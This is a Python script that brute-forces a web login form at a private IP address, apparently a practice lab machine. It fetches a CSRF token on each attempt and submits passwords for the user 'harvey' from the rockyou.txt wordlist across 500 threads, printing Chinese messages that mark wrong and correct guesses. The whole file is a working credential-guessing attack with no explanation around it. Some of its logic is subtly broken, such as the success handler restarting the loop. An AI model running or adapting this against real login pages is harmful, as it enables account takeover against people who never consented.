import requests
import requests,random,re,json
from bs4 import BeautifulSoup

from concurrent.futures import ThreadPoolExecutor
def exploit(csrf,password):
	cookies = {
	    'PHPSESSID': 'bg3jifjl8h1t4si92hsj17n5d1',
	}
	
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Content-Type': 'application/x-www-form-urlencoded',
	    'Origin': 'http://10.129.90.147',
	    'Connection': 'keep-alive',
	    'Referer': 'http://10.129.90.147/monitor/',
	    'Upgrade-Insecure-Requests': '1',
	}
	
	data = {
	  'csrf': csrf,
	  'user_name': 'harvey',
	  'user_password': password,
	  'action': 'login'
	}
	
	response = requests.post('http://10.129.90.147/monitor/', headers=headers, cookies=cookies, data=data)
	soup = BeautifulSoup(response.text,'html.parser', from_encoding='utf-8')
	result = soup.find_all('p')
	return result[1].string


def get_csrf():
	cookies = {
	    'PHPSESSID': 'bg3jifjl8h1t4si92hsj17n5d1',
	}
	
	headers = {
	    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	    'Accept-Language': 'en-US,en;q=0.5',
	    'Connection': 'keep-alive',
	    'Upgrade-Insecure-Requests': '1',
	}
	
	response = requests.get('http://10.129.90.147/monitor/', headers=headers, cookies=cookies)
	csrf = re.findall('value="(.*?)" />',response.text)
	return csrf



def job(password):
	csrf = get_csrf()
	result = exploit(csrf,password)
	if result == 'The information is incorrect.':
		print("密碼錯誤",password)
	else:
		print("密碼正確＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠＠",password)
		run().setDaemon(True)
def run():
	with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as file:
		with ThreadPoolExecutor(max_workers=500) as executor:
			for i in file.readlines():
				password = i.strip()
				executor.submit(job,password)
run()